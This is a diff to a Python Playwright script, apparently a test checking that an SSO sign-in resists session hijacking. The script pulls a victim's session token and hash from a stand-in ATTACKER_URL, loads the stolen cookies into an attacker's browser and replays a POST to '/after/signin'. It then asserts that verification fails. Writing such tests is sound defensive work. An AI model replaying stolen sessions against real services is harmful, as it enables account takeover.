@@ -53,14 +53,13 @@ async def main():
             res = await client.get(f"{ATTACKER_URL}/data/session_token")
             creds = res.json()
             session_token = creds['session_token']
-            secret = creds['secret']
+            hash = creds['hash']
 
         print("session_token: ", session_token)
-        print("secret: ", secret)
+        print("hash: ", hash)
         assert(session_token != None)
-        assert(secret != None)
-        
-        
+        assert(hash != None)
+
         # Sign up(attacker, attacker's browser)
         page = await sso_flow(page)
         await page.click('#registerButton')
@@ -92,17 +91,21 @@ async def main():
         }])
         cookies = await context.cookies()
         print("cookies: ", cookies)
-        await page.evaluate('(secret) => localStorage.setItem("secret", secret)', secret)
 
-        # After sigin in(attacker, victim's browser)
-        await page.click('#afterLoginRequestButton')
-        time.sleep(3) # wait 3 seconds
-       
-        content = await page.content()
-        soup = BeautifulSoup(content, 'html.parser')
-        result = soup.find('p', id='content')
-        print("after sign in result (attacker): ", result)
-        assert("After sigin in request failed." in result)
+        # After sigin in(attacker, attacker's browser)
+        res = await page.evaluate('''async (hash) => {
+            const response = await fetch("/after/signin", {
+                method: "POST",
+                credentials: "same-origin",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ hash: hash })
+            });
+            return response.json(); // assuming the response is JSON
+        }''', hash)
+        print("after sign in result (attacker): ", res)
+        assert(res['verified'] == False)
 
         await browser.close()
         
